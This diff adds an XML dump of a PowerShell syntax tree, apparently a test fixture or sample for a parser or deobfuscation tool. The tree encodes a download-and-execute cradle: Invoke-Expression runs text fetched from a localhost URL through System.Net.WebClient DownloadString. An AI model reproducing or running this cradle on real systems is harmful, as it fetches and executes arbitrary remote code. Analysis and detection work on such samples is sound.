@@ -1,0 +1,26 @@
+<ScriptBlockAst>
+  <UsingStatements />
+  <NamedBlockAst>
+    <Statements>
+      <CommandAst>
+            <CommandElements>
+              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke-Expression</StringConstantExpressionAst>
+              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                <Arguments>
+                  <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">http://127.0.0.1:8899/qiye.txt</StringConstantExpressionAst>
+                </Arguments>
+                <ParenExpressionAst StaticType="System.Object">
+                  <CommandAst>
+                        <CommandElements>
+                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
+                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">System.Net.WebClient</StringConstantExpressionAst>
+                        </CommandElements>
+                        </CommandAst>
+                    </ParenExpressionAst>
+                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">DownloadString</StringConstantExpressionAst>
+              </InvokeMemberExpressionAst>
+            </CommandElements>
+            </CommandAst>
+        </Statements>
+  </NamedBlockAst>
+</ScriptBlockAst>
